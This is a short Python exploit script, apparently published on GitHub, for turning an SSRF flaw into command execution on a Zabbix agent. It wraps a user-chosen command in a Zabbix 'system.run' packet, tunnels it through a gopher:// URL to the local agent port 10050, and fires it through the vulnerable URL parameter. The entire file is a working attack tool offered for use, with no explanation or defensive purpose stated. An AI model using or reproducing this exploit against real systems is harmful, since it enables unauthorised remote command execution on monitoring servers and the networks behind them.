'''

########################################
                                       @
Made by: raulfanti                     @
GitHub: https://github.com/raulfanti   @
                                       @
########################################

'''

from pwn import *
import urllib
import requests
import argparse

parser = argparse.ArgumentParser(
    prog="polyglotte.py",
    description="Polyglotte: A tool to exploit Zabbix SSRF vulnerabilities",
    usage='%(prog)s [options]. Example: %(prog)s -c "id" -u "http://example.com/?vulnerable_parameter=EXPLOIT"',
)

parser.add_argument('--command', '-c', required=True, help='The command to execute on the target system')
parser.add_argument('--url', '-u', required=True, help='The vulnerable URL and parameter to exploit (e.g., http://example.com/?vulnerable_parameter=)')
parser.add_argument('--method', '-m', default='GET', help='HTTP method to use for the request (default: GET)')
parser.add_argument('--data', '-d', help='Data to include in the request body')
parser.add_argument('--custom-gopher-url', '-g', help='Custom gopher URL (default: gopher://127.0.0.1:10050/_)')
parser.add_argument('-H', '--header', action='append', help='Custom header to include in the request (can be used multiple times, e.g., -H "User-Agent: Custom" -H "X-Custom-Header: Value")')

args = parser.parse_args()

ZABBIX_HEADER = "ZBXD\x01"
KEY = "system.run["+args.command+"]"
GOPHER_URL = args.custom_gopher_url if args.custom_gopher_url else "gopher://127.0.0.1:10050/_"
VULNERABLE_URL = args.url.replace("EXPLOIT", "")

length = str(p64(len(KEY) + 2).decode('utf-8', 'ignore'))
payload = ZABBIX_HEADER+length+KEY
final_url = (VULNERABLE_URL + GOPHER_URL + urllib.parse.quote(urllib.parse.quote(payload)))

r = requests.request(args.method, final_url, data=args.data, headers={h.split(':', 1)[0]: h.split(':', 1)[1].strip() for h in args.header} if args.header else None)

print(r.text)